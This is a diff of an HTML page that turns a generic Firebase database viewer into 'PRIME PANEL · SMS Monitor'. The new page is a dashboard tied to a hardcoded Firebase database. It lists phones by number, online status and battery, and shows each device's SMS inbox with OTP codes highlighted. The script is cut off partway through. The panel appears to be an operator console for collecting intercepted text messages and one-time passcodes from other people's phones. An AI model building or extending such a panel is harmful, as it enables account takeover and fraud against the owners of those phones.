@@ -1,629 +1,1109 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>RTDB Browser — Realtime Database Viewer</title>
-<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
-<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
-<style>
-  :root{
-    --bg: #0b0d0f;
-    --panel: #121417;
-    --line: #232629;
-    --ink: #e7e5e1;
-    --ink-dim: #8b8f94;
-    --ink-faint: #55595e;
-    --accent: #7dd3c0;
-    --accent-dim: #3a5f57;
-    --warn: #d98c4a;
-    --mono: "SF Mono", "JetBrains Mono", Menlo, Consolas, monospace;
-    --sans: "Inter", -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
-  }
-  *{box-sizing:border-box;}
-  html,body{height:100%;}
-  body{
-    margin:0;
-    background:var(--bg);
-    color:var(--ink);
-    font-family:var(--sans);
-    font-size:14px;
-  }
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>PRIME PANEL · SMS Monitor</title>
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js">
+    </script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js">
+    </script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
 
-  /* ===== Connect screen ===== */
-  #connectScreen{
-    height:100vh;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    padding:20px;
-  }
-  .connect-card{
-    width:100%;
-    max-width:440px;
-    background:var(--panel);
-    border:1px solid var(--line);
-    border-radius:4px;
-    padding:32px;
-  }
-  .connect-card .eyebrow{
-    font-family:var(--mono);
-    font-size:11px;
-    letter-spacing:0.12em;
-    color:var(--accent);
-    text-transform:uppercase;
-    margin-bottom:6px;
-  }
-  .connect-card h1{
-    font-size:20px;
-    font-weight:600;
-    margin:0 0 4px;
-    letter-spacing:-0.01em;
-  }
-  .connect-card p.desc{
-    color:var(--ink-dim);
-    font-size:13px;
-    margin:0 0 24px;
-    line-height:1.5;
-  }
-  label{
-    display:block;
-    font-size:11px;
-    color:var(--ink-dim);
-    margin-bottom:6px;
-    font-family:var(--mono);
-    letter-spacing:0.02em;
-  }
-  input[type=text], input[type=url]{
-    width:100%;
-    background:#0a0b0c;
-    border:1px solid var(--line);
-    border-radius:3px;
-    padding:10px 12px;
-    color:var(--ink);
-    font-family:var(--mono);
-    font-size:13px;
-    outline:none;
-    margin-bottom:16px;
-  }
-  input[type=text]:focus, input[type=url]:focus{
-    border-color:var(--accent-dim);
-  }
-  .btn{
-    width:100%;
-    background:var(--accent);
-    color:#08110f;
-    border:none;
-    border-radius:3px;
-    padding:11px;
-    font-weight:600;
-    font-size:13px;
-    cursor:pointer;
-    font-family:var(--sans);
-  }
-  .btn:hover{ filter:brightness(1.08); }
-  .btn:disabled{ opacity:0.5; cursor:default; }
-  .connect-error{
-    margin-top:14px;
-    font-size:12px;
-    color:var(--warn);
-    font-family:var(--mono);
-    display:none;
-    line-height:1.5;
-  }
-  .connect-note{
-    margin-top:20px;
-    font-size:11px;
-    color:var(--ink-faint);
-    line-height:1.5;
-  }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+            background: #0a0e17;
+            color: #e0e0e0;
+            min-height: 100vh;
+            padding: 12px;
+        }
 
-  /* ===== App shell ===== */
-  #app{ display:none; height:100vh; flex-direction:column; }
-  .topbar{
-    display:flex;
-    align-items:center;
-    justify-content:space-between;
-    padding:12px 18px;
-    border-bottom:1px solid var(--line);
-    flex-shrink:0;
-    gap:12px;
-    flex-wrap:wrap;
-  }
-  .topbar .brand{ display:flex; align-items:center; gap:10px; }
-  .brand .dot{
-    width:7px; height:7px; border-radius:50%;
-    background:var(--accent);
-    box-shadow:0 0 0 3px var(--accent-dim);
-  }
-  .brand .name{ font-weight:600; font-size:13px; }
-  .brand .url{
-    font-family:var(--mono);
-    font-size:11px;
-    color:var(--ink-faint);
-    max-width:340px;
-    overflow:hidden;
-    text-overflow:ellipsis;
-    white-space:nowrap;
-  }
-  .topbar .actions{ display:flex; align-items:center; gap:8px; }
-  .icon-btn{
-    background:transparent;
-    border:1px solid var(--line);
-    color:var(--ink-dim);
-    border-radius:3px;
-    padding:6px 12px;
-    font-size:11px;
-    font-family:var(--mono);
-    cursor:pointer;
-  }
-  .icon-btn:hover{ border-color:var(--accent-dim); color:var(--ink); }
+        .container {
+            max-width: 1440px;
+            margin: 0 auto;
+        }
 
-  .body-layout{
-    flex:1;
-    display:grid;
-    grid-template-columns:300px 1fr;
-    min-height:0;
-  }
-  @media (max-width:820px){
-    .body-layout{ grid-template-columns:1fr; }
-    .tree-panel{ max-height:40vh; }
-  }
+        /* HEADER */
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px 20px;
+            background: rgba(20, 30, 50, 0.75);
+            backdrop-filter: blur(4px);
+            border-radius: 12px;
+            border: 1px solid rgba(100, 150, 255, 0.08);
+            margin-bottom: 14px;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
 
-  .tree-panel{
-    border-right:1px solid var(--line);
-    display:flex;
-    flex-direction:column;
-    min-height:0;
-  }
-  .tree-search{
-    padding:12px;
-    border-bottom:1px solid var(--line);
-    flex-shrink:0;
-  }
-  .tree-search input{ margin-bottom:0; }
-  .tree-scroll{
-    flex:1;
-    overflow-y:auto;
-    padding:6px;
-  }
-  .tree-scroll::-webkit-scrollbar{ width:4px; }
-  .tree-scroll::-webkit-scrollbar-thumb{ background:var(--line); border-radius:2px; }
+        .header-left h1 {
+            font-size: 20px;
+            color: #4fc3f7;
+            font-weight: 700;
+            letter-spacing: -0.3px;
+        }
 
-  .tree-node{ font-family:var(--mono); font-size:12.5px; }
-  .tree-row{
-    display:flex;
-    align-items:center;
-    gap:4px;
-    padding:4px 6px;
-    border-radius:3px;
-    cursor:pointer;
-    color:var(--ink-dim);
-    white-space:nowrap;
-  }
-  .tree-row:hover{ background:#181b1e; color:var(--ink); }
-  .tree-row.selected{ background:var(--accent-dim); color:var(--ink); }
-  .tree-row .caret{
-    width:12px; flex-shrink:0; color:var(--ink-faint);
-    transform:rotate(0deg); transition:transform .12s;
-    font-size:10px;
-  }
-  .tree-row .caret.open{ transform:rotate(90deg); }
-  .tree-row .key{ flex-shrink:0; }
-  .tree-row .type-tag{
-    font-size:9px;
-    color:var(--ink-faint);
-    margin-left:auto;
-    padding-left:8px;
-  }
-  .tree-children{ margin-left:14px; border-left:1px solid var(--line); padding-left:4px; }
+        .header-left .subtitle {
+            font-size: 10px;
+            color: #7a8a9a;
+            letter-spacing: 1.2px;
+            text-transform: uppercase;
+            opacity: 0.7;
+        }
 
-  .detail-panel{
-    display:flex;
-    flex-direction:column;
-    min-height:0;
-  }
-  .detail-header{
-    padding:14px 18px;
-    border-bottom:1px solid var(--line);
-    flex-shrink:0;
-  }
-  .detail-path{
-    font-family:var(--mono);
-    font-size:13px;
-    color:var(--ink);
-    word-break:break-all;
-  }
-  .detail-path .seg-sep{ color:var(--ink-faint); margin:0 3px; }
-  .detail-meta{
-    font-size:11px;
-    color:var(--ink-faint);
-    margin-top:4px;
-    font-family:var(--mono);
-  }
-  .detail-body{
-    flex:1;
-    overflow:auto;
-    padding:18px;
-  }
-  .empty-state{
-    height:100%;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    color:var(--ink-faint);
-    font-size:13px;
-    text-align:center;
-    flex-direction:column;
-    gap:8px;
-  }
-  .empty-state .big{ font-size:24px; opacity:0.5; }
+        .header-right {
+            display: flex;
+            align-items: center;
+            gap: 18px;
+            flex-wrap: wrap;
+        }
 
-  pre.json-view{
-    font-family:var(--mono);
-    font-size:12.5px;
-    line-height:1.6;
-    color:var(--ink);
-    background:var(--panel);
-    border:1px solid var(--line);
-    border-radius:4px;
-    padding:16px;
-    white-space:pre-wrap;
-    word-break:break-word;
-    margin:0;
-  }
-  .json-key{ color:var(--accent); }
-  .json-string{ color:#c9b98a; }
-  .json-number{ color:#7fb3d9; }
-  .json-bool{ color:var(--warn); }
-  .json-null{ color:var(--ink-faint); font-style:italic; }
+        .header-right .stats {
+            display: flex;
+            gap: 24px;
+        }
 
-  .toast{
-    position:fixed;
-    bottom:20px; left:50%; transform:translateX(-50%);
-    background:var(--panel);
-    border:1px solid var(--line);
-    color:var(--ink);
-    font-size:12px;
-    font-family:var(--mono);
-    padding:9px 16px;
-    border-radius:4px;
-    opacity:0;
-    pointer-events:none;
-    transition:opacity .2s;
-    z-index:100;
-  }
-  .toast.show{ opacity:1; }
+        .header-right .stat-item {
+            text-align: center;
+        }
 
-  .status-strip{
-    display:flex;
-    align-items:center;
-    gap:6px;
-    font-family:var(--mono);
-    font-size:10px;
-    color:var(--ink-faint);
-  }
-  .status-strip .live-dot{
-    width:5px; height:5px; border-radius:50%;
-    background:var(--accent);
-    animation:blink 2s infinite;
-  }
-  @keyframes blink{ 0%,100%{opacity:1;} 50%{opacity:0.35;} }
-</style>
+        .header-right .stat-item .number {
+            font-size: 26px;
+            font-weight: 700;
+            color: #4fc3f7;
+            line-height: 1.1;
+        }
+
+        .header-right .stat-item .number.online {
+            color: #4caf50;
+        }
+
+        .header-right .stat-item .label {
+            font-size: 9px;
+            color: #7a8a9a;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+        }
+
+        .refresh-btn {
+            background: rgba(79, 195, 247, 0.08);
+            color: #4fc3f7;
+            border: 1px solid rgba(79, 195, 247, 0.15);
+            padding: 6px 16px;
+            border-radius: 20px;
+            font-size: 11px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.25s;
+            backdrop-filter: blur(2px);
+        }
+
+        .refresh-btn:hover {
+            background: rgba(79, 195, 247, 0.18);
+            border-color: rgba(79, 195, 247, 0.3);
+            transform: scale(1.02);
+        }
+
+        .live-badge {
+            font-size: 10px;
+            color: #4caf50;
+            background: rgba(76, 175, 80, 0.12);
+            padding: 4px 14px;
+            border-radius: 20px;
+            border: 1px solid rgba(76, 175, 80, 0.15);
+            animation: pulse 2.4s infinite;
+            font-weight: 500;
+            letter-spacing: 0.3px;
+        }
+
+        @keyframes pulse {
+            0%,
+            100% {
+                opacity: 1;
+            }
+            50% {
+                opacity: 0.45;
+            }
+        }
+
+        /* SIM SLOTS */
+        .sim-slots {
+            display: flex;
+            gap: 6px;
+            margin-bottom: 14px;
+            flex-wrap: wrap;
+        }
+
+        .sim-slot {
+            background: rgba(20, 30, 50, 0.5);
+            border: 1px solid rgba(100, 150, 255, 0.06);
+            border-radius: 8px;
+            padding: 6px 16px;
+            min-width: 44px;
+            text-align: center;
+            font-size: 11px;
+            font-weight: 600;
+            color: #7a8a9a;
+            cursor: default;
+            transition: all 0.2s;
+            backdrop-filter: blur(2px);
+        }
+
+        .sim-slot.active {
+            border-color: #4fc3f7;
+            color: #4fc3f7;
+            background: rgba(79, 195, 247, 0.07);
+            box-shadow: 0 0 12px rgba(79, 195, 247, 0.04);
+        }
+
+        .sim-slot .slot-number {
+            font-size: 10px;
+            color: #556;
+        }
+
+        /* MAIN LAYOUT */
+        .main-layout {
+            display: grid;
+            grid-template-columns: 1fr 400px;
+            gap: 14px;
+        }
+
+        @media (max-width: 1024px) {
+            .main-layout {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        /* PANELS */
+        .devices-panel,
+        .inbox-panel {
+            background: rgba(20, 30, 50, 0.5);
+            backdrop-filter: blur(4px);
+            border-radius: 12px;
+            border: 1px solid rgba(100, 150, 255, 0.06);
+            padding: 16px;
+            transition: border-color 0.2s;
+        }
+
+        .devices-panel:hover,
+        .inbox-panel:hover {
+            border-color: rgba(100, 150, 255, 0.12);
+        }
+
+        .panel-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 12px;
+            flex-wrap: wrap;
+            gap: 6px;
+        }
+
+        .panel-header h2 {
+            font-size: 14px;
+            color: #d0d8e0;
+            font-weight: 500;
+            letter-spacing: 0.2px;
+        }
+
+        .panel-header .badge {
+            font-size: 10px;
+            color: #7a8a9a;
+            background: rgba(255, 255, 255, 0.03);
+            padding: 3px 12px;
+            border-radius: 20px;
+            border: 1px solid rgba(255, 255, 255, 0.04);
+        }
+
+        /* SEARCH + TOGGLE */
+        .search-box {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 12px;
+        }
+
+        .search-box input {
+            flex: 1;
+            background: rgba(0, 0, 0, 0.35);
+            border: 1px solid rgba(100, 150, 255, 0.06);
+            border-radius: 8px;
+            padding: 8px 14px;
+            color: #d0d8e0;
+            font-size: 12px;
+            outline: none;
+            transition: all 0.25s;
+        }
+
+        .search-box input::placeholder {
+            color: #4a5a6a;
+        }
+
+        .search-box input:focus {
+            border-color: rgba(79, 195, 247, 0.2);
+            background: rgba(0, 0, 0, 0.45);
+        }
+
+        .toggle-group {
+            display: flex;
+            gap: 3px;
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 8px;
+            padding: 3px;
+            flex-shrink: 0;
+        }
+
+        .toggle-group button {
+            background: transparent;
+            border: none;
+            color: #7a8a9a;
+            padding: 4px 14px;
+            border-radius: 6px;
+            font-size: 10px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .toggle-group button.active {
+            background: rgba(79, 195, 247, 0.12);
+            color: #4fc3f7;
+        }
+
+        .toggle-group button:hover:not(.active) {
+            color: #c8d0d8;
+        }
+
+        /* DEVICES GRID */
+        .devices-grid {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 6px;
+            max-height: 520px;
+            overflow-y: auto;
+            padding-right: 4px;
+        }
+
+        .devices-grid::-webkit-scrollbar {
+            width: 3px;
+        }
+
+        .devices-grid::-webkit-scrollbar-track {
+            background: rgba(255, 255, 255, 0.02);
+            border-radius: 4px;
+        }
+
+        .devices-grid::-webkit-scrollbar-thumb {
+            background: rgba(79, 195, 247, 0.15);
+            border-radius: 4px;
+        }
+
+        .device-card {
+            background: rgba(0, 0, 0, 0.25);
+            border-radius: 8px;
+            padding: 10px 14px;
+            border: 1px solid rgba(100, 150, 255, 0.04);
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .device-card:hover {
+            border-color: rgba(79, 195, 247, 0.12);
+            background: rgba(0, 0, 0, 0.35);
+        }
+
+        .device-card.selected {
+            border-color: #4fc3f7;
+            background: rgba(79, 195, 247, 0.06);
+            box-shadow: 0 0 16px rgba(79, 195, 247, 0.03);
+        }
+
+        .device-card.offline {
+            opacity: 0.4;
+        }
+
+        .device-card .device-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .device-card .device-id {
+            font-family: monospace;
+            font-size: 11px;
+            color: #5a6a7a;
+        }
+
+        .device-card .device-phone {
+            font-size: 13px;
+            color: #d0d8e0;
+            font-weight: 500;
+        }
+
+        .device-card .device-phone.copyable {
+            cursor: pointer;
+            color: #4fc3f7;
+        }
+
+        .device-card .device-phone.copyable:hover {
+            text-decoration: underline;
+            text-underline-offset: 2px;
+        }
+
+        .device-card .device-status {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .device-card .status-dot {
+            width: 7px;
+            height: 7px;
+            border-radius: 50%;
+            display: inline-block;
+        }
+
+        .device-card .status-dot.online {
+            background: #4caf50;
+            box-shadow: 0 0 10px rgba(76, 175, 80, 0.25);
+        }
+
+        .device-card .status-dot.offline {
+            background: #445;
+        }
+
+        .device-card .battery {
+            font-size: 11px;
+            color: #5a6a7a;
+        }
+
+        .device-card .sms-count {
+            font-size: 10px;
+            color: #5a6a7a;
+            background: rgba(255, 255, 255, 0.03);
+            padding: 1px 10px;
+            border-radius: 12px;
+            border: 1px solid rgba(255, 255, 255, 0.04);
+        }
+
+        .device-card .device-sms-preview {
+            margin-top: 6px;
+            padding-top: 6px;
+            border-top: 1px solid rgba(255, 255, 255, 0.03);
+            font-size: 11px;
+            color: #5a6a7a;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .device-card .device-sms-preview .sender {
+            color: #4fc3f7;
+        }
+
+        /* INBOX */
+        .inbox-panel {
+            display: flex;
+            flex-direction: column;
+            max-height: 640px;
+        }
+
+        .inbox-panel .panel-header {
+            flex-shrink: 0;
+        }
+
+        .inbox-panel .panel-header .device-info {
+            font-size: 11px;
+            color: #5a6a7a;
+        }
+
+        .inbox-panel .panel-header .device-info strong {
+            color: #d0d8e0;
+        }
+
+        .inbox-messages {
+            flex: 1;
+            overflow-y: auto;
+            padding-right: 4px;
+            margin-top: 6px;
+            contain: layout style paint;
+        }
+
+        .inbox-messages::-webkit-scrollbar {
+            width: 3px;
+        }
+
+        .inbox-messages::-webkit-scrollbar-track {
+            background: rgba(255, 255, 255, 0.02);
+            border-radius: 4px;
+        }
+
+        .inbox-messages::-webkit-scrollbar-thumb {
+            background: rgba(79, 195, 247, 0.15);
+            border-radius: 4px;
+        }
+
+        .inbox-message {
+            background: rgba(0, 0, 0, 0.2);
+            border-radius: 8px;
+            padding: 10px 14px;
+            margin-bottom: 6px;
+            border-left: 2px solid rgba(79, 195, 247, 0.15);
+            animation: slideIn 0.25s ease;
+            contain: content;
+            transition: background 0.15s;
+        }
+
+        .inbox-message:hover {
+            background: rgba(0, 0, 0, 0.3);
+        }
+
+        .inbox-message .msg-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 4px;
+        }
+
+        .inbox-message .msg-sender {
+            font-size: 11px;
+            font-weight: 600;
+            color: #4fc3f7;
+        }
+
+        .inbox-message .msg-time {
+            font-size: 9px;
+            color: #4a5a6a;
+        }
+
+        .inbox-message .msg-body {
+            font-size: 12px;
+            color: #d0d8e0;
+            word-break: break-word;
+            line-height: 1.5;
+        }
+
+        .inbox-message .msg-body .otp-code {
+            color: #ffb74d;
+            font-weight: 700;
+            font-size: 14px;
+            background: rgba(255, 183, 77, 0.08);
+            padding: 0 8px;
+            border-radius: 4px;
+        }
+
+        .inbox-placeholder {
+            text-align: center;
+            color: #4a5a6a;
+            font-size: 12px;
+            padding: 40px 0;
+        }
+
+        .loading {
+            text-align: center;
+            padding: 24px;
+            color: #4a5a6a;
+            font-size: 12px;
+        }
+
+        .spinner {
+            border: 2px solid rgba(79, 195, 247, 0.08);
+            border-top: 2px solid #4fc3f7;
+            border-radius: 50%;
+            width: 22px;
+            height: 22px;
+            animation: spin 0.9s linear infinite;
+            margin: 0 auto 8px;
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateY(-8px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        /* TOAST */
+        .toast {
+            position: fixed;
+            bottom: 24px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(16, 24, 40, 0.94);
+            backdrop-filter: blur(8px);
+            padding: 10px 28px;
+            border-radius: 40px;
+            border: 1px solid rgba(79, 195, 247, 0.12);
+            color: #d0d8e0;
+            font-size: 13px;
+            display: none;
+            z-index: 1000;
+            animation: fadeIn 0.25s ease;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
+            pointer-events: none;
+        }
+
+        .toast.show {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateX(-50%) translateY(12px);
+            }
+            to {
+                opacity: 1;
+                transform: translateX(-50%) translateY(0);
+            }
+        }
+
+        .notification-dot {
+            display: none;
+            width: 8px;
+            height: 8px;
+            background: #ffb74d;
+            border-radius: 50%;
+            margin-left: 8px;
+            animation: pulse 1.2s infinite;
+            vertical-align: middle;
+        }
+
+        .notification-dot.show {
+            display: inline-block;
+        }
+
+        /* responsive */
+        @media (max-width: 768px) {
+            body {
+                padding: 8px;
+            }
+            .header {
+                padding: 10px 14px;
+                flex-direction: column;
+                align-items: stretch;
+            }
+            .header-right {
+                justify-content: space-between;
+            }
+            .main-layout {
+                grid-template-columns: 1fr;
+            }
+            .inbox-panel {
+                max-height: 420px;
+            }
+            .devices-grid {
+                max-height: 320px;
+            }
+            .sim-slots {
+                justify-content: center;
+            }
+        }
+    </style>
 </head>
 <body>
 
-<!-- ===== Connect Screen ===== -->
-<div id="connectScreen">
-  <div class="connect-card">
-    <div class="eyebrow">Realtime Database</div>
-    <h1>Connect to your project</h1>
-    <p class="desc">Paste the databaseURL from your Firebase project settings. This tool opens a read-only connection — no writes are ever made.</p>
-
-    <label for="dbUrlInput">Database URL</label>
-    <input type="url" id="dbUrlInput" placeholder="https://your-project-default-rtdb.region.firebasedatabase.app">
-
-    <label for="rootPathInput">Root path (optional)</label>
-    <input type="text" id="rootPathInput" placeholder="/ (leave blank for database root)">
-
-    <button class="btn" id="connectBtn" onclick="connect()">Connect</button>
-    <div class="connect-error" id="connectError"></div>
-    <div class="connect-note">Works with databases whose rules allow public read access. If your rules require authentication, this tool will show a permission error on connect.</div>
-  </div>
-</div>
-
-<!-- ===== App ===== -->
-<div id="app">
-  <div class="topbar">
-    <div class="brand">
-      <span class="dot"></span>
-      <span class="name">RTDB Browser</span>
-      <span class="url" id="brandUrl"></span>
-    </div>
-    <div class="actions">
-      <span class="status-strip"><span class="live-dot"></span><span id="nodeCountLabel">0 nodes</span></span>
-      <button class="icon-btn" onclick="exportJson()">Export JSON</button>
-      <button class="icon-btn" onclick="disconnect()">Disconnect</button>
-    </div>
-  </div>
-
-  <div class="body-layout">
-    <div class="tree-panel">
-      <div class="tree-search">
-        <input type="text" id="treeSearch" placeholder="Filter by key..." oninput="renderTree()">
-      </div>
-      <div class="tree-scroll" id="treeScroll"></div>
-    </div>
-
-    <div class="detail-panel">
-      <div class="detail-header">
-        <div class="detail-path" id="detailPath">/</div>
-        <div class="detail-meta" id="detailMeta"></div>
-      </div>
-      <div class="detail-body" id="detailBody">
-        <div class="empty-state">
-          <div class="big">⌁</div>
-          <div>Select a node from the tree to inspect it</div>
+    <div class="container">
+        <!-- HEADER -->
+        <div class="header">
+            <div class="header-left">
+                <h1>📱 PRIME PANEL</h1>
+                <div class="subtitle">REAL-TIME SMS · NOTIFICATIONS</div>
+            </div>
+            <div class="header-right">
+                <span class="live-badge">● LIVE</span>
+                <div class="stats">
+                    <div class="stat-item">
+                        <div class="number online" id="onlineCount">0</div>
+                        <div class="label">Online</div>
+                    </div>
+                    <div class="stat-item">
+                        <div class="number" id="smsCount">0</div>
+                        <div class="label">SMS</div>
+                    </div>
+                </div>
+                <button class="refresh-btn" onclick="manualRefresh()">⟳ Refresh</button>
+            </div>
         </div>
-      </div>
+
+        <!-- SIM SLOTS (visual) -->
+        <div class="sim-slots" id="simSlots">
+            <div class="sim-slot active"><span class="slot-number">📱</span> S1</div>
+            <div class="sim-slot">S2</div>
+            <div class="sim-slot">S3</div>
+            <div class="sim-slot">S4</div>
+            <div class="sim-slot">S5</div>
+            <div class="sim-slot">S6</div>
+            <div class="sim-slot">S7</div>
+            <div class="sim-slot">S8</div>
+        </div>
+
+        <!-- MAIN -->
+        <div class="main-layout">
+            <!-- DEVICES -->
+            <div class="devices-panel">
+                <div class="panel-header">
+                    <h2>📱 Devices</h2>
+                    <span class="badge" id="deviceCount">0 devices</span>
+                </div>
+                <div class="search-box">
+                    <input type="text" id="searchInput" placeholder="Search by ID or phone..." oninput="filterDevices()" />
+                    <div class="toggle-group">
+                        <button class="active" id="allToggle" onclick="setFilter('all')">All</button>
+                        <button id="onlineToggle" onclick="setFilter('online')">Online</button>
+                    </div>
+                </div>
+                <div class="devices-grid" id="devicesGrid">
+                    <div class="loading">Loading devices ...</div>
+                </div>
+            </div>
+
+            <!-- INBOX -->
+            <div class="inbox-panel">
+                <div class="panel-header">
+                    <div>
+                        <h2>📨 Inbox <span class="notification-dot" id="newMsgDot"></span></h2>
+                        <div class="device-info" id="selectedDeviceInfo">Select a device</div>
+                    </div>
+                    <div class="device-info" id="smsTotalCount" style="font-size:10px;color:#4a5a6a;"></div>
+                </div>
+                <div class="inbox-messages" id="inboxMessages">
+                    <div class="inbox-placeholder">👈 Select a device</div>
+                </div>
+            </div>
+        </div>
     </div>
-  </div>
-</div>
 
-<div class="toast" id="toast"></div>
+    <!-- TOAST -->
+    <div class="toast" id="toast"></div>
 
-<script>
-  let db = null;
-  let rootRef = null;
-  let treeData = {};       // full snapshot of everything under rootRef
-  let expandedPaths = new Set();
-  let selectedPath = null;
-  let rootPathPrefix = '';
+    <script>
+        // ===== FIREBASE =====
+        const firebaseConfig = {
+            databaseURL: "https://sssssmmmmsw-default-rtdb.asia-southeast1.firebasedatabase.app"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
 
-  function showToast(msg){
-    const t = document.getElementById('toast');
-    t.textContent = msg;
-    t.classList.add('show');
-    clearTimeout(t._tm);
-    t._tm = setTimeout(() => t.classList.remove('show'), 2200);
-  }
+        // ===== STATE =====
+        let allUsers = {};
+        let selectedDeviceId = null;
+        let currentFilter = 'all';
+        let searchQuery = '';
+        let isInitialLoad = true;
 
-  function showConnectError(msg){
-    const el = document.getElementById('connectError');
-    el.textContent = msg;
-    el.style.display = 'block';
-  }
-
-  function connect(){
-    const url = document.getElementById('dbUrlInput').value.trim();
-    const rootPath = document.getElementById('rootPathInput').value.trim();
-    const errEl = document.getElementById('connectError');
-    errEl.style.display = 'none';
-
-    if(!url){
-      showConnectError('Enter a database URL first.');
-      return;
-    }
-    if(!/^https:\/\/.+firebasedatabase\.app\/?$/.test(url) && !/^https:\/\/.+\.firebaseio\.com\/?$/.test(url)){
-      showConnectError('That doesn\'t look like a Realtime Database URL. It should end in firebasedatabase.app or firebaseio.com.');
-      return;
-    }
-
-    const btn = document.getElementById('connectBtn');
-    btn.disabled = true;
-    btn.textContent = 'Connecting…';
-
-    try{
-      if(firebase.apps.length){
-        firebase.apps.forEach(a => a.delete());
-      }
-      firebase.initializeApp({ databaseURL: url });
-      db = firebase.database();
-      rootPathPrefix = rootPath.replace(/^\/+|\/+$/g, '');
-      rootRef = rootPathPrefix ? db.ref(rootPathPrefix) : db.ref('/');
-
-      rootRef.on('value', snap => {
-        treeData = snap.val() || {};
-        document.getElementById('connectScreen').style.display = 'none';
-        document.getElementById('app').style.display = 'flex';
-        document.getElementById('brandUrl').textContent = url.replace(/^https:\/\//,'') + (rootPathPrefix ? '/' + rootPathPrefix : '');
-        renderTree();
-        updateNodeCount();
-        btn.disabled = false;
-        btn.textContent = 'Connect';
-      }, err => {
-        btn.disabled = false;
-        btn.textContent = 'Connect';
-        showConnectError('Could not read data: ' + err.message + '. This usually means the database rules require authentication.');
-      });
-    } catch(e){
-      btn.disabled = false;
-      btn.textContent = 'Connect';
-      showConnectError('Connection failed: ' + e.message);
-    }
-  }
-
-  function disconnect(){
-    if(rootRef) rootRef.off();
-    if(firebase.apps.length) firebase.apps.forEach(a => a.delete());
-    db = null; rootRef = null; treeData = {}; expandedPaths = new Set(); selectedPath = null;
-    document.getElementById('app').style.display = 'none';
-    document.getElementById('connectScreen').style.display = 'flex';
-    document.getElementById('dbUrlInput').value = '';
-    document.getElementById('rootPathInput').value = '';
-  }
-
-  function countNodes(obj){
-    if(obj === null || typeof obj !== 'object') return 1;
-    let n = 0;
-    for(const k in obj) n += countNodes(obj[k]);
-    return n;
-  }
-
-  function updateNodeCount(){
-    document.getElementById('nodeCountLabel').textContent = countNodes(treeData) + ' nodes';
-  }
-
-  function getAtPath(pathParts){
-    let cur = treeData;
-    for(const p of pathParts){
-      if(cur === null || typeof cur !== 'object' || !(p in cur)) return undefined;
-      cur = cur[p];
-    }
-    return cur;
-  }
-
-  function matchesFilter(key, val, query){
-    if(!query) return true;
-    if(key.toLowerCase().includes(query)) return true;
-    if(val !== null && typeof val === 'object'){
-      for(const k in val){
-        if(matchesFilter(k, val[k], query)) return true;
-      }
-      return false;
-    }
-    return String(val).toLowerCase().includes(query);
-  }
-
-  function renderTree(){
-    const container = document.getElementById('treeScroll');
-    container.innerHTML = '';
-    const query = document.getElementById('treeSearch').value.trim().toLowerCase();
-
-    if(treeData === null || typeof treeData !== 'object' || Object.keys(treeData).length === 0){
-      container.innerHTML = '<div class="empty-state" style="height:120px;">No data at this path</div>';
-      return;
-    }
-
-    const rootEl = buildTreeLevel(treeData, [], query);
-    container.appendChild(rootEl);
-  }
-
-  function buildTreeLevel(obj, pathParts, query){
-    const wrap = document.createElement('div');
-    const keys = Object.keys(obj).sort();
-
-    keys.forEach(key => {
-      const val = obj[key];
-      const currentPath = [...pathParts, key];
-      const pathStr = currentPath.join('/');
-
-      if(query && !matchesFilter(key, val, query)) return;
-
-      const isObject = val !== null && typeof val === 'object';
-      const row = document.createElement('div');
-      row.className = 'tree-node';
-
-      const rowInner = document.createElement('div');
-      rowInner.className = 'tree-row' + (selectedPath === pathStr ? ' selected' : '');
-      rowInner.onclick = (e) => {
-        e.stopPropagation();
-        if(isObject){
-          if(expandedPaths.has(pathStr)) expandedPaths.delete(pathStr);
-          else expandedPaths.add(pathStr);
+        // ===== TOAST =====
+        function showToast(msg) {
+            const t = document.getElementById('toast');
+            t.textContent = msg;
+            t.classList.add('show');
+            clearTimeout(t._timeout);
+            t._timeout = setTimeout(() => t.classList.remove('show'), 2200);
         }
-        selectedPath = pathStr;
-        renderTree();
-        renderDetail(currentPath);
-      };
 
-      const caret = document.createElement('span');
-      caret.className = 'caret' + (expandedPaths.has(pathStr) ? ' open' : '');
-      caret.textContent = isObject ? '▸' : '·';
-      rowInner.appendChild(caret);
-
